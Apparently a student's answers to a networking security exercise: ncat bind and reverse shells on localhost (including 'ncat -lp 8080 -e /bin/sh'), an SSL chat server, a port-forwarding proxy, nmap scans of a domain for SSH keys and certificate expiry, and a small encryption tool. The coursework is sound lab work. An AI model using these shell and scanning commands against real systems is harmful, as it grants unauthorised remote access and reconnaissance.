# Exercise 4

## 1

### 1.1

-   Server

```sh
ncat -lp 8080 -e /bin/sh
```

-   Client

```sh
ncat localhost 8080
pwd
```

### 1.2

-   Server

```sh
ncat -lp 8080
pwd
```

-   Client

```sh
ncat localhost 8080 -e /bin/sh

```

### 1.3

Yes, but the `/bin/sh` has to be changed to `pw.exe` on Windows to be able to execute Powershell commands

### 1.4

`-u, --udp Use UDP instead of default TCP`

Bind-shell works but reverse-shells don't

## 2

### Server

```sh
ncat --ssl --allow 127.0.0.1 --chat -o 'chat.log'  -lkp 4000

-l, --listen               'Bind and listen for incoming connections'
-p, --source-port port     'Specify source port to use'
-k, --keep-open            'Accept multiple connections in listen mode'
-o, --output <filename>    'Dump session data to a file'
--ssl                  'Connect or listen with SSL'
--allow                'Allow only given hosts to connect to Ncat'
--chat                 'Start a simple Ncat chat server'
```

### Client

```sh
ncat --ssl localhost 4000
```

## 3

```sh
while $(ncat -lp 8080 -c 'ncat localhost 80'); do
    true;
done
```

Is a proxy that forwards each request from port 8080 to port 80

### 4

Geht nicht

### 5

-   Which ports are used for SSH?
    The default port 22

    ```sh
    nmap delta-xi.net | grep ssh

    22/tcp open ssh
    ```

-   What’s the RSA public key for SSH?

    ```sh
    nmap -script 'ssh-hostkey' delta-xi.net

    | ssh-hostkey:
    |   256 0ffa22a64fd47aa5928a7bd850abf757 (ECDSA)
    |_  256 0bd869e3131da13aac7851283bea6e67 (ED25519)
    ```

-   When does the IMAP certificate expire?

    ```sh
    nmap -p 993 -sC delta-xi.net

    _Not valid after:  2022-10-29T18:46:53
    ```

### 6

```sh
echo -n "hello world" | cargo run -- -key key.txt -enc

Encrypted: 0RqJwHYOzYMUJNBZ/IMqJA==
```

```sh
echo "0RqJwHYOzYMUJNBZ/IMqJA==" | cargo run -- -key key.txt -dec

Decrypted: hello world
```
